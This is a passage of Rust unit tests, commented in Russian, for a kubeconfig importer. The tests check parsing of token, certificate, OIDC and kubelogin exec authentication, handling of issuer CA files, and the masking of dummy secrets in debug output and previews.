        assert_eq!(
            kind.profile.auth,
            AuthConfig::ClientCert {
                certificate_pem: TEST_CERT_PEM.into()
            }
        );
        assert!(
            kind.client_key
                .unwrap()
                .starts_with("-----BEGIN PRIVATE KEY-----")
        );
        assert_eq!(
            kind.profile.ca,
            CaConfig::Pem {
                pem: TEST_CERT_PEM.into()
            },
            "CA из файла по пути"
        );

        assert_eq!(get("no-user").unwrap().profile.auth, AuthConfig::Browser);
        let oidc = get("corp-oidc").unwrap();
        assert_eq!(
            oidc.profile.auth,
            AuthConfig::Oidc(OidcAuth {
                issuer_url: "https://sso.corp/realms/k8s".into(),
                client_id: "k8s".into(),
                scopes: DEFAULT_OIDC_SCOPES.map(String::from).to_vec(),
                issuer_ca_pem: None,
            })
        );
        assert!(oidc.token.is_none() && oidc.client_key.is_none());
        assert!(oidc.oidc_client_secret.is_none());
        // Выбран exec-плагин: строка запуска, как без варианта OIDC.
        let c = p.contexts.iter().find(|c| c.name == "corp-oidc").unwrap();
        let exec = import_context(&k, "corp-oidc", &with_exec(c).unwrap()).unwrap();
        let AuthConfig::Exec(e) = &exec.profile.auth else {
            panic!("exec")
        };
        assert!(e.command.ends_with("kubelogin"));
        assert_eq!(get("evil").unwrap_err().key, "errors.exec.notAllowed");
        assert_eq!(get("preload").unwrap_err().key, "errors.exec.envForbidden");
    }

    #[test]
    fn existing_profile_keeps_its_id_and_bad_data_is_an_error() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let mut existing = sample_profile("old");
        existing.name = "lab".into();
        existing.api_url = "https://api.lab:6443".into();
        let p = preview(&k, dir.path(), &[existing], &open(), &installed);
        let lab = p.contexts.iter().find(|c| c.name == "lab").unwrap();
        assert_eq!(import_context(&k, "lab", lab).unwrap().profile.id, "old");

        let bad = kc(r#"
clusters:
- name: c
  cluster: {server: "https://api.c:6443", certificate-authority-data: "%%%"}
users:
- name: u
  user: {token: t}
contexts:
- name: x
  context: {cluster: c, user: u}
"#);
        let p = preview(&bad, dir.path(), &[], &open(), &installed);
        assert_eq!(
            import_context(&bad, "x", &p.contexts[0]).unwrap_err().key,
            "errors.kubeconfig.badBase64"
        );
    }

    /// `{:?}` импортированного контекста (лог, `unwrap_err`, `assert!`) не показывает ни токен,
    /// ни приватный ключ.
    #[test]
    fn debug_of_imported_context_hides_token_and_key() {
        let k = kc(&format!(
            r#"
clusters:
- name: c
  cluster: {{server: "https://api.c:6443"}}
users:
- name: t
  user: {{token: "sha256~SECRET-TOKEN-TEXT"}}
- name: k
  user:
    client-certificate-data: {cert}
    client-key-data: {key}
contexts:
- name: with-token
  context: {{cluster: c, user: t}}
- name: with-key
  context: {{cluster: c, user: k}}
"#,
            cert = b64(TEST_CERT_PEM),
            key = b64("-----BEGIN PRIVATE KEY-----\nSECRET-KEY-BODY\n-----END PRIVATE KEY-----\n"),
        ));
        let dir = tempfile::tempdir().unwrap();
        let p = preview(&k, dir.path(), &[], &open(), &installed);
        let get = |n: &str| {
            let c = p.contexts.iter().find(|c| c.name == n).unwrap();
            import_context(&k, n, c).unwrap()
        };

        let with_token = get("with-token");
        assert_eq!(
            with_token.token.as_deref(),
            Some("sha256~SECRET-TOKEN-TEXT")
        );
        let text = format!("{with_token:?}");
        assert!(!text.contains("SECRET-TOKEN-TEXT"), "{text}");
        assert!(text.contains("with-token"), "профиль виден: {text}");
        assert!(text.contains("***"), "{text}");

        let with_key = get("with-key");
        assert!(
            with_key
                .client_key
                .as_deref()
                .unwrap()
                .contains("SECRET-KEY-BODY")
        );
        let text = format!("{with_key:#?}");
        assert!(!text.contains("SECRET-KEY-BODY"), "{text}");
        assert!(!text.contains("BEGIN PRIVATE KEY"), "{text}");
        assert!(text.contains("***"), "{text}");
    }

    /// Устаревший или чужой предпросмотр (способ входа не тот, что в файле) — внутренняя ошибка,
    /// а не паника.
    #[test]
    fn mismatched_preview_is_an_internal_error_not_a_panic() {
        let dir = tempfile::tempdir().unwrap();
        let k = kc(&sample(dir.path()));
        let p = preview(&k, dir.path(), &[], &open(), &installed);
        let ctx = |n: &str| p.contexts.iter().find(|c| c.name == n).unwrap().clone();
        // (контекст, способ входа в предпросмотре): в файле нет пользователя, либо у пользователя
        // нет токена или сертификата.
        for (name, auth) in [
            ("no-user", ImportAuth::Token),
            ("no-user", ImportAuth::ClientCert),
            ("corp-oidc", ImportAuth::Token),
            ("corp-oidc", ImportAuth::ClientCert),
            ("kind-admin", ImportAuth::Token),
            ("dev/api-dev:6443/alice", ImportAuth::ClientCert),
        ] {
            let mut c = ctx(name);
            c.auth = auth;
            let e = import_context(&k, name, &c).unwrap_err();
            assert_eq!(
                (e.code, e.key.as_str()),
                (ErrorCode::Internal, "errors.internal"),
                "{name} как {auth:?}"
            );
        }
        // Предпросмотр говорит «exec», а строки запуска в нём нет.
        let mut c = ctx("corp-oidc");
        c.auth = ImportAuth::Exec;
        c.exec = None;
        let e = import_context(&k, "corp-oidc", &c).unwrap_err();
        assert_eq!(e.key, "errors.internal");
    }

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn oidc_login_reads_kubelogin_arguments() {
        // `--k=v` и `--k v`, scope повторяемый и через запятую, секрет клиента, CA издателя.
        let OidcLogin {
            auth,
            client_secret: secret,
            issuer_ca,
        } = oidc_login(
            "/usr/local/bin/kubectl",
            &args(&[
                "oidc-login",
                "get-token",
                "--oidc-issuer-url",
                "https://auth.c1.example.com/",
                "--oidc-client-id=dapp",
                "--oidc-client-secret",
                "s3cr3t",
                "--oidc-extra-scope=email,groups",
                "--oidc-extra-scope",
                "profile",
                "--oidc-extra-scope=offline_access",
                "--certificate-authority=/x/ca.pem",
            ]),
        )
        .unwrap();
        assert_eq!(auth.issuer_url, "https://auth.c1.example.com/");
        assert_eq!(auth.client_id, "dapp");
        assert_eq!(
            auth.scopes,
            ["openid", "email", "groups", "profile", "offline_access"]
        );
        assert_eq!(secret.as_deref(), Some("s3cr3t"));
        assert_eq!(issuer_ca, Some(IssuerCa::File("/x/ca.pem".into())));
        assert_eq!(auth.issuer_ca_pem, None, "файл читает предпросмотр");

        // Без client id и scope — значения DropApp; секрета и CA нет.
        let login = oidc_login(
            "kubelogin",
            &args(&["-v", "4", "get-token", "--oidc-issuer-url=https://sso.corp"]),
        )
        .unwrap();
        assert_eq!(login.auth.client_id, DEFAULT_OIDC_CLIENT_ID);
        assert_eq!(login.auth.scopes, DEFAULT_OIDC_SCOPES);
        assert_eq!((login.client_secret, login.issuer_ca), (None, None));

        // CA данными важнее CA файлом, как `certificate-authority-data` в kubeconfig.
        let login = oidc_login(
            "kubelogin",
            &args(&[
                "get-token",
                "--oidc-issuer-url=https://sso.corp",
                "--certificate-authority",
                "ca.pem",
                "--certificate-authority-data=QUJD",
            ]),
        )
        .unwrap();
        assert_eq!(login.issuer_ca, Some(IssuerCa::Data("QUJD".into())));

        // Не OIDC: без издателя, Azure kubelogin, другая команда или подкоманда.
        for (command, list) in [
            ("kubelogin", &["get-token", "--oidc-client-id=dapp"][..]),
            (
                "kubelogin",
                &[
                    "get-token",
                    "--login",
                    "devicecode",
                    "--server-id",
                    "6dae42f8",
                    "--oidc-issuer-url=https://sso.corp",
                ][..],
            ),
            (
                "kubelogin",
                &[
                    "get-token",
                    "--login=azurecli",
                    "--oidc-issuer-url=https://sso.corp",
                ][..],
            ),
            (
                "kubectl",
                &["oidc-login", "setup", "--oidc-issuer-url=https://sso.corp"][..],
            ),
            (
                "aws",
                &["eks", "get-token", "--oidc-issuer-url=https://sso.corp"][..],
            ),
        ] {
            assert!(
                oidc_login(command, &args(list)).is_none(),
                "{command} {list:?}"
            );
        }
    }

    /// Kubeconfig от Loginapp DropApp: `kubectl oidc-login`, опечатка в `apiVersion`, kubectl на
    /// машине нет — вход через OIDC всё равно доступен; секрет клиента в предпросмотр не попадает.
    #[test]
    fn dropapp_kubeconfig_imports_as_oidc_without_the_plugin() {
        let k = kc(r#"
clusters:
- name: c1
  cluster: {server: "https://api.c1.example.com:6443"}
users:
- name: oidc
  user:
    exec:
      apiVersion: client.authentication.io/v1beta1
      command: kubectl
      args:
      - oidc-login
      - get-token
      - --oidc-issuer-url=https://auth.c1.example.com
      - --oidc-client-id=dapp
      - --oidc-client-secret=Zm9vYmFy-s3cr3t
      - --oidc-extra-scope=groups
- name: aks
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: kubelogin
      args: [get-token, --login, devicecode, --server-id, 6dae42f8, --oidc-issuer-url=https://sso.corp]
contexts:
- name: dropapp
  context: {cluster: c1, user: oidc}
- name: aks
  context: {cluster: c1, user: aks}
"#);
        let dir = tempfile::tempdir().unwrap();
        let p = preview(&k, dir.path(), &[], &open(), &installed);
        let c = &p.contexts[0];
        assert_eq!((c.auth, c.unsupported.clone()), (ImportAuth::Oidc, None));
        let oidc = c.oidc.as_ref().unwrap();
        assert_eq!(oidc.auth.issuer_url, "https://auth.c1.example.com");
        assert_eq!(oidc.auth.scopes, ["openid", "groups"]);
        assert!(oidc.has_client_secret);
        assert_eq!(c.exec, None);
        assert_eq!(
            c.exec_unsupported.as_ref().unwrap().key,
            "errors.exec.badApiVersion"
        );
        let json = serde_json::to_string(&p).unwrap();
        assert!(!json.contains("s3cr3t"), "{json}");
        assert!(json.contains(r#""hasClientSecret":true"#), "{json}");

        let imported = import_context(&k, "dropapp", c).unwrap();
        assert_eq!(
            imported.profile.auth,
            AuthConfig::Oidc(OidcAuth {
                issuer_url: "https://auth.c1.example.com".into(),
                client_id: "dapp".into(),
                scopes: vec!["openid".into(), "groups".into()],
                issuer_ca_pem: None,
            })
        );
        assert_eq!(
            imported.oidc_client_secret.as_deref(),
            Some("Zm9vYmFy-s3cr3t")
        );
        assert!(!format!("{imported:?}").contains("s3cr3t"));
        // Exec-плагин выбрать нельзя: причина — его собственная.
        let e = with_exec(c).unwrap_err();
        assert_eq!(e.key, "errors.exec.badApiVersion");

        // Azure kubelogin варианта OIDC не даёт.
        let aks = &p.contexts[1];
        assert_eq!((aks.auth, aks.oidc.clone()), (ImportAuth::Exec, None));
    }

    /// Kubeconfig с `--certificate-authority` у `oidc-login`: относительный путь — от каталога
    /// kubeconfig, данные — base64; нечитаемый CA вход через OIDC не отменяет — предупреждение с
    /// путём, а подключение импортируется без CA издателя.
    #[test]
    fn issuer_ca_comes_from_the_oidc_login_arguments() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("dex-ca.crt"), TEST_CERT_PEM).unwrap();
        // Общий файл с сертификатом и приватным ключом: ключ не должен попасть в предпросмотр.
        let bundle = format!(
            "{TEST_CERT_PEM}\n-----BEGIN PRIVATE KEY-----\nc2VjcmV0\n-----END PRIVATE KEY-----\n"
        );
        std::fs::write(dir.path().join("bundle.pem"), &bundle).unwrap();
        let user = |name: &str, ca: &str| {
            format!(
                r#"
- name: {name}
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      command: kubectl
      args: [oidc-login, get-token, --oidc-issuer-url=https://dex.c1.example.com, "{ca}"]"#
            )
        };
        let k = kc(&format!(
            r#"
clusters:
- name: c1
  cluster: {{server: "https://api.c1.example.com:6443"}}
users:{}{}{}{}{}{}
contexts:
- name: file
  context: {{cluster: c1, user: file}}
- name: data
  context: {{cluster: c1, user: data}}
- name: missing
  context: {{cluster: c1, user: missing}}
- name: not-pem
  context: {{cluster: c1, user: not-pem}}
- name: key-file
  context: {{cluster: c1, user: key-file}}
- name: key-data
  context: {{cluster: c1, user: key-data}}
"#,
            user("file", "--certificate-authority=dex-ca.crt"),
            user(
                "data",
                &format!("--certificate-authority-data={}", b64(TEST_CERT_PEM))
            ),
            user("missing", "--certificate-authority=missing.crt"),
            user(
                "not-pem",
                &format!("--certificate-authority-data={}", b64("nope"))
            ),
            user("key-file", "--certificate-authority=bundle.pem"),
            user(
                "key-data",
                &format!("--certificate-authority-data={}", b64(&bundle))
            ),
        ));
        let path = dir.path().join("config");
        let p = preview(&k, &path, &[], &open(), &installed);
        let ctx = |n: &str| p.contexts.iter().find(|c| c.name == n).unwrap();
        for name in ["file", "data"] {
            let c = ctx(name);
            let oidc = c.oidc.as_ref().unwrap();
            assert_eq!(
                oidc.auth.issuer_ca_pem.as_deref(),
                Some(TEST_CERT_PEM),
                "{name}"
            );
            assert_eq!(oidc.issuer_ca_warning, None, "{name}");
            let imported = import_context(&k, name, c).unwrap();
            let AuthConfig::Oidc(auth) = &imported.profile.auth else {
                panic!("oidc")
            };
            assert_eq!(auth.issuer_ca_pem.as_deref(), Some(TEST_CERT_PEM), "{name}");
        }
        let missing = dir.path().join("missing.crt").display().to_string();
        let bundle_path = dir.path().join("bundle.pem").display().to_string();
        for (name, shown) in [
            ("missing", missing.as_str()),
            ("not-pem", "--certificate-authority-data"),
            ("key-file", bundle_path.as_str()),
            ("key-data", "--certificate-authority-data"),
        ] {
            let c = ctx(name);
            assert_eq!(
                (c.auth, c.unsupported.clone()),
                (ImportAuth::Oidc, None),
                "{name}"
            );
            let oidc = c.oidc.as_ref().unwrap();
            assert_eq!(oidc.auth.issuer_ca_pem, None, "{name}");
            let warning = oidc.issuer_ca_warning.as_ref().unwrap();
            assert_eq!(
                warning.key, "errors.kubeconfig.issuerCaUnreadable",
                "{name}"
            );
            assert_eq!(warning.params["path"], shown, "{name}");
            let imported = import_context(&k, name, c).unwrap();
            let AuthConfig::Oidc(auth) = &imported.profile.auth else {
                panic!("oidc")
            };
            assert_eq!(auth.issuer_ca_pem, None, "{name}");
        }
        let json = serde_json::to_value(&p).unwrap();
        assert_eq!(
            json["contexts"][2]["oidc"]["issuerCaWarning"]["key"],
            "errors.kubeconfig.issuerCaUnreadable"
        );
        // Ни ключ, ни его текст не попадают в предпросмотр (в том числе в предупреждение).
        let text = json.to_string();
        assert!(
            !text.contains("PRIVATE KEY") && !text.contains("c2VjcmV0"),
            "{text}"
        );
    }

    /// Файл CA больше 1 МиБ или не обычный файл (каталог) — то же предупреждение, без чтения.
    #[test]
    fn oversized_or_irregular_issuer_ca_file_is_a_warning() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("big.pem"), vec![b'a'; 1024 * 1024 + 1]).unwrap();
        std::fs::create_dir(dir.path().join("sub")).unwrap();
        for file in ["big.pem", "sub"] {
            let ca = IssuerCa::File(file.to_string());
            let e = issuer_ca_pem(&ca, Some(dir.path())).unwrap_err();
            assert_eq!(e.key, "errors.kubeconfig.issuerCaUnreadable", "{file}");
        }
    }

    #[test]
    fn unreadable_file_is_an_input_error() {
        let e = read(Path::new("/no/such/kubeconfig")).unwrap_err();
        assert_eq!(e.key, "errors.kubeconfig.unreadable");
    }
}
